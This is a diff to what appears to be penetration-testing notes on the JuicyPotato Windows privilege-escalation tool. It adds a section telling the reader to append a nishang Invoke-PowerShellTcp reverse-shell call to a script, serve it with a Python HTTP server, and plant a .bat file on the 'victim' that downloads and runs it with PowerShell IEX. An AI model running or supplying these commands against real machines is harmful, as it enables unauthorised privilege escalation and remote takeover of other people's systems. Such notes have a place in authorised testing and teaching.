@@ -17,11 +17,26 @@ JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t *
 If the above method doesn't work (automatic using BITS), use a CLSID as shown in the following command:
 
 ```bash
-JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t * -c {$CLSID}
+JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t * -c '{$CLSID}'
 #Change $CLSID with any correct OS CLSID.
 ```
 
 List of [CLSID's](https://ohpe.it/juicy-potato/CLSID/).
+
+### **Bat file:**
+
+```bash
+#Use nishang PowerShellTcp reverse shell:
+#path:
+/opt/nishang/Shells/Invoke-PowerShellTcp.ps1
+
+#Add the following line at the end of the file:
+Invoke-PowerShellTcp -Reverse -IPAddress $IPADDRESS -Port $PORT
+
+#Create a .bat file at the victim with the following line:
+powershell "IEX(New-Object Net.WebClient).downloadString('http://XX.XX/file.ps1')"
+#Serve it with python SimpleHTTPServer
+```
 
 More info at:
 
